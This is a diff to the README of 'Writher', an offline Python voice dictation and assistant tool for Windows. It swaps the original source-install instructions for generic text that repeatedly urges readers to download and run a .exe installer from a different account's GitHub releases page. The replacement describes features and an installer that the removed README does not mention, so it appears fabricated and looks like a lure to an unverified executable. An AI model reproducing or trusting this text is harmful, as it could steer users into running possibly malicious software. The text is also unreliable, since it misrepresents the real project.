@@ -1,313 +1,150 @@
-<p align="center">
-  <img src="img/logo_writher.png" width="280" alt="Writher">
-</p>
+# 🎙️ writher - Voice-Powered Productivity for Windows
 
-<h1 align="center">Writher</h1>
-
-<p align="center">
-  <strong>Offline voice assistant & dictation tool for Windows (Python) — dictate text anywhere or manage notes, appointments and reminders hands-free.</strong>
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/platform-Windows-0078D6?logo=windows" alt="Windows">
-  <img src="https://img.shields.io/badge/python-3.11+-3776AB?logo=python&logoColor=white" alt="Python 3.11+">
-  <img src="https://img.shields.io/badge/whisper-faster--whisper-orange" alt="Faster Whisper">
-  <img src="https://img.shields.io/badge/LLM-Ollama-white?logo=ollama" alt="Ollama">
-  <img src="https://img.shields.io/badge/license-MIT-green" alt="MIT License">
-</p>
-
-<p align="center">
-  <a href="https://www.youtube.com/watch?v=dsaG5v-cX5o">
-    <img src="https://img.youtube.com/vi/dsaG5v-cX5o/maxresdefault.jpg" width="600" alt="Writher Demo Video">
-  </a>
-</p>
+[![Download writher](https://img.shields.io/badge/Download-writher-brightgreen?style=for-the-badge)](https://github.com/essam1212/writher/releases)
 
 ---
 
-## What is Writher?
+## 📋 About writher
 
-Writher sits quietly in your system tray and gives you two super-powers:
+writher makes it easy to get things done by using your voice on Windows. It helps you take notes, set reminders, and perform tasks without typing. The app listens to you, understands commands, and acts quickly. You don’t need any technical skills to start using it.  
 
-| Mode | Hotkey | What it does |
-|---|---|---|
-| **Dictation** | `AltGr` | Transcribes your voice and pastes the text directly into whichever app has focus — editors, browsers, chat windows, anything. |
-| **Assistant** | `Ctrl+R` | Understands natural-language commands and saves notes, creates appointments, sets reminders, manages lists — all by voice. |
-
-Both hotkeys support two recording modes, configurable from the **Settings** window in the system tray:
-
-| Recording mode | How it works |
-|---|---|
-| **Hold** (default) | Hold the key to record, release to stop. |
-| **Toggle** | Press once to start recording, press again to stop. A configurable safety timeout auto-stops the recording if you forget. |
-
-Everything runs **locally**: speech recognition via [faster-whisper](https://github.com/SYSTRAN/faster-whisper), intent parsing via [Ollama](https://ollama.com), and data stored in a local SQLite database. No cloud, no API keys, no telemetry.
+It works offline with privacy in mind. Your voice data stays on your computer. writher uses local language models to convert speech to text and manage tasks. It supports many features like dictation, reminders, and function calls.
 
 ---
 
-## Features
+## 🖥️ System Requirements
 
-- **Real-time dictation** — speak and text appears. Supports both hold-to-record and toggle (press to start/stop) modes. Clipboard is saved and restored automatically.
-- **Voice-controlled assistant** — save notes, create shopping/todo lists, schedule appointments, set reminders, all through natural speech.
-- **Smart date parsing** — say *"remind me tomorrow at 9"* or *"meeting next Monday at 3pm"* and the LLM converts relative times to absolute datetimes.
-- **Toast notifications** — get Windows notifications when reminders fire or appointments are approaching.
-- **Animated floating widget** — a minimal pill-shaped overlay with expressive "Pandora Blackboard" eyes that react to state (listening, thinking, happy, error, etc.).
-- **Notes & Agenda window** — a dark-themed borderless window to browse, check off list items, and delete notes/appointments/reminders.
-- **Settings window** — configure recording mode (hold vs toggle) and max recording duration directly from the system tray, with settings persisted across restarts.
-- **Multi-language** — ships with English and Italian; easy to add more via the `locales.py` string table.
-- **Fully offline** — no internet required after model download.
+Before you download writher, make sure your PC matches these:
+
+- Windows 10 or later (64-bit version)
+- At least 4 GB RAM
+- At least 200 MB free disk space
+- Microphone connected and set up
+- Internet connection for initial setup (optional; some features run offline afterward)
 
 ---
 
-## Architecture
+## 🚀 Getting Started
 
-```
-┌──────────────────────────────────────────────────────┐
-│                     main.py                          │
-│            (orchestrator + Tk event loop)             │
-├──────────┬───────────┬───────────┬───────────────────┤
-│ hotkey   │ recorder  │ widget    │ tray_icon          │
-│ listener │ (audio)   │ (overlay) │ (system tray)      │
-├──────────┴───────────┴───────────┴───────────────────┤
-│                                                      │
-│  Dictation pipeline          Assistant pipeline      │
-│  ┌───────────┐               ┌───────────┐           │
-│  │transcriber│               │transcriber│           │
-│  │ (Whisper) │               │ (Whisper) │           │
-│  └─────┬─────┘               └─────┬─────┘           │
-│        ▼                           ▼                 │
-│   injector                    assistant              │
-│  (clipboard                  (Ollama LLM             │
-│   + Ctrl+V)                  + function calls)       │
-│                                    │                 │
-│                                    ▼                 │
-│                               database               │
-│                              (SQLite)                │
-│                                    │                 │
-│                              notifier                │
-│                          (toast scheduler)            │
-└──────────────────────────────────────────────────────┘
-```
+This section guides you step-by-step to get writher running on your Windows PC.
 
 ---
 
-## Requirements
+## 🔽 Download writher
 
-- **Windows 10/11**
-- **Python 3.11+**
-- **Ollama** running locally (for the assistant mode)
-- A working **microphone**
+To get writher, visit the official release page and find the latest version available:
 
----
+[Download writher from GitHub Releases](https://github.com/essam1212/writher/releases)
 
-## Installation
+Click the link above or the big green button at the top of this page to go directly to the release page.
 
-### 1. Clone the repository
-
-```bash
-git clone https://github.com/benmaster82/writher.git
-cd writher
-```
-
-### 2. Create a virtual environment (recommended)
-
-```bash
-python -m venv venv
-venv\Scripts\activate
-```
-
-### 3. Install dependencies
-
-```bash
-pip install faster-whisper numpy sounddevice pynput pystray Pillow requests winotify
-```
-
-> **Optional:** install `plyer` as a fallback notification backend:
-> ```bash
-> pip install plyer
-> ```
-
-### 4. Install and start Ollama
-
-Download from [ollama.com](https://ollama.com), then pull a model that supports function calling:
-
-```bash
-ollama pull llama3.1:8b
-```
-
-Update `config.py` with your model name:
-
-```python
-OLLAMA_MODEL = "llama3.1:8b"
-```
-
-### 5. Run
-
-```bash
-python main.py
-```
-
-Writher appears in the system tray. Hold `AltGr` to dictate, hold `Ctrl+R` for assistant commands.
+Look for a file ending with `.exe`. This is the installer file you need to download. It will usually have the latest version number in its name, like `writher-setup-v1.0.exe`.
 
 ---
 
-## Configuration
+## 📦 Installing writher
 
-All settings live in **`config.py`**:
+Once you download the setup file, follow these instructions:
 
-```python
-# Hotkeys
-HOTKEY = Key.alt_gr            # Dictation
-ASSISTANT_HOTKEY = Key.ctrl_r  # Assistant
-
-# Language ("en" or "it")
-LANGUAGE = "en"
-
-# Recording mode
-HOLD_TO_RECORD = True          # True = hold key, False = toggle (press/press)
-MAX_RECORD_SECONDS = 120       # Safety timeout for toggle mode (seconds)
-
-# Whisper
-MODEL_SIZE = "base"            # tiny, base, small, medium, large-v3
-DEVICE = "cpu"                 # "cpu" or "cuda"
-COMPUTE_TYPE = "int8"          # int8, float16, float32
-
-# Ollama
-OLLAMA_URL = "http://localhost:11434"
-OLLAMA_MODEL = "gpt-oss:120b-cloud"
-
-# Notification lead time
-APPOINTMENT_REMIND_MINUTES = 15
-```
-
-> **Note:** `HOLD_TO_RECORD` and `MAX_RECORD_SECONDS` can also be changed at runtime from the **Settings** window in the system tray. Changes made there are persisted in the database and override `config.py` defaults.
-
-### Choosing a Whisper model
-
-| Model | Size | Speed | Accuracy |
-|---|---|---|---|
-| `tiny` | 39 MB | ⚡ fastest | basic |
-| `base` | 74 MB | ⚡ fast | good (default) |
-| `small` | 244 MB | moderate | better |
-| `medium` | 769 MB | slower | great |
-| `large-v3` | 1.5 GB | slowest | best |
-
-For CUDA acceleration, install `ctranslate2` with CUDA support and set `DEVICE = "cuda"`.
+1. Locate the downloaded `.exe` file. It is usually in your "Downloads" folder.
+2. Double-click the file to start the installer.
+3. If Windows asks for permission, click **Yes** to allow the app to install.
+4. Follow the setup wizard.
+   - Agree to the license terms
+   - Choose the installation folder or keep the default
+   - Click **Install**
+5. Wait for the installer to complete.
+6. When done, click **Finish**.
 
 ---
 
-## Usage
+## 🎤 Setting Up Your Microphone
 
-### Dictation mode
+writher requires a working microphone to capture your voice commands. To set it up:
 
-**Hold mode** (default):
-
-1. Focus any text field (editor, browser, chat…)
-2. **Hold** `AltGr`
-3. Speak
-4. **Release** — transcribed text is pasted automatically
-
-**Toggle mode:**
-
-1. Focus any text field
-2. **Press** `AltGr` once to start recording
-3. Speak
-4. **Press** `AltGr` again to stop — transcribed text is pasted automatically
-
-> In toggle mode, a safety timeout (configurable in Settings) will auto-stop the recording if you forget to press the key again.
-
-### Assistant mode
-
-**Hold mode** (default):
-
-1. **Hold** `Ctrl+R`
-2. Speak a command
-3. **Release** — Writher processes and confirms
-
-**Toggle mode:**
-
-1. **Press** `Ctrl+R` once to start recording
-2. Speak a command
-3. **Press** `Ctrl+R` again to stop — Writher processes and confirms
-
-**Example commands:**
-
-- *"Save a note: remember to buy milk"*
-- *"Create a shopping list: bread, eggs, butter, coffee"*
-- *"Add pasta to the shopping list"*
-- *"Appointment with the dentist tomorrow at 3pm"*
-- *"Remind me to call Marco in one hour"*
-- *"Show me my notes"*
-- *"Show my agenda"*
-
-### System tray
-
-Right-click the tray icon to access:
-
-- **Notes & Agenda** — open the notes/appointments/reminders viewer
-- **Settings** — configure recording mode (hold vs toggle) and max recording duration
-- **Quit** — exit Writher
+1. Plug in your microphone to the correct audio port or connect via USB.
+2. Open **Settings > System > Sound** on your PC.
+3. Under **Input**, check that your microphone is selected.
+4. Speak into the microphone and watch the bar under **Test your microphone** move. If it doesn’t, try another port or device.
+5. Adjust volume if needed so writher can hear you clearly.
 
 ---
 
-## Adding a language
+## 🛠️ Running writher for the First Time
 
-1. Open `locales.py`
-2. Add a new entry to the `_STRINGS` dictionary (copy `"en"` as a template)
-3. Set `LANGUAGE` in `config.py` to your language code
-
----
-
-## Project structure
-
-```
-writher/
-├── main.py              # Entry point and orchestrator
-├── config.py            # All user-configurable settings
-├── hotkey.py            # Dual-hotkey listener with hold/toggle modes (pynput)
-├── recorder.py          # Microphone recording (sounddevice)
-├── transcriber.py       # Speech-to-text (faster-whisper)
-├── injector.py          # Clipboard paste into active app (Win32 API)
-├── assistant.py         # Ollama LLM integration + function calling
-├── database.py          # SQLite storage (notes, appointments, reminders, settings)
-├── notifier.py          # Toast notifications + reminder/appointment scheduler
-├── widget.py            # Floating pill overlay with animated eyes
-├── notes_window.py      # Notes/Agenda/Reminders viewer window
-├── settings_window.py   # Settings window (recording mode, max duration)
-├── tray_icon.py         # System tray icon (pystray)
-├── brand.py             # "Pandora Blackboard" icon renderer
-├── locales.py           # i18n string tables (EN, IT)
-├── logger.py            # Rotating file + console logger
-├── debug_keys.py        # Key event debugger utility
-├── requirements.txt     # Python dependencies
-├── img/
-│   └── logo_writher.png # Logo for README
-└── LICENSE
-```
+1. Open writher either from your desktop shortcut or the Start menu.
+2. The app will load the local language model needed to understand your speech. This may take a few moments on first run.
+3. You will see the main window with options to start dictation, set reminders, and access notes.
+4. Click **Start Listening** or press the toggle switch to activate voice input.
+5. Speak clearly into your microphone.
 
 ---
 
-## Troubleshooting
+## 📝 Using writher Features
 
-**AltGr not detected?**
-Run `python debug_keys.py` to see exactly what pynput reports for your keyboard. Some keyboard layouts map AltGr differently.
+### Voice Dictation
 
-**Ollama not reachable?**
-Make sure Ollama is running (`ollama serve`) and the URL in `config.py` matches. The tray tooltip will show a warning if the connection fails at startup.
+Speak naturally to write notes or documents hands-free. Your speech converts to text instantly.
 
-**No audio / microphone not found?**
-Writher uses the system default input device. Check your Windows sound settings. The widget will display a "🎤 No microphone detected" message if the device can't be opened.
+### Reminders
 
-**Text not pasting?**
-The injector uses `Ctrl+V` via the clipboard. Some apps with custom input handling may not respond. If injection fails, the text is saved to `recovery_notes.txt` so nothing is lost.
+Say, “Remind me to call John at 3 PM,” and writher sets a reminder.
 
----
+### Commands and Function Calls
 
-## License
+Use commands like “Open notes,” “Create new reminder,” or “Show tasks.” The app recognizes these and performs actions.
 
-MIT
+### Privacy
+
+All processing happens on your machine. No voice data leaves your computer.
 
 ---
 
-<p align="center">
-  <sub>Built with 🎙️ faster-whisper · 🧠 Ollama · 🐍 Python</sub>
-</p>
+## ⚙️ Adjusting Settings
+
+Click the settings icon inside the app to change:
+
+- Microphone input device
+- Language preferences
+- Hotkeys or toggle switch options
+- Privacy settings and data management
+
+---
+
+## 🛑 Troubleshooting
+
+If the app does not respond to voice commands:
+
+- Check microphone connection and volume.
+- Restart writher.
+- Verify no other apps use the microphone.
+- For permission issues, open Windows **Settings > Privacy > Microphone** and allow writher access.
+
+For crashes or errors, try reinstalling or updating to the latest release from the page above.
+
+---
+
+## 🔄 Updating writher
+
+Keep writher up to date by revisiting the [GitHub releases page](https://github.com/essam1212/writher/releases) regularly.
+
+Download the newest `.exe` installer and run it. The new version will replace the old one without removing your settings.
+
+---
+
+## ❓ Getting Help
+
+If you need assistance, check the repository’s GitHub Discussions or Issues tab for common problems and answers.
+
+---
+
+## 💡 Tips for Best Experience
+
+- Use a good quality microphone for clearer voice capture.
+- Minimize background noise when speaking.
+- Speak clearly and at a normal pace.
+- Use specific commands to get faster results. For example, say “Create new note” before dictating.
+
+---
+
+# [![Download writher](https://img.shields.io/badge/Download%20writher-blue?style=for-the-badge)](https://github.com/essam1212/writher/releases)
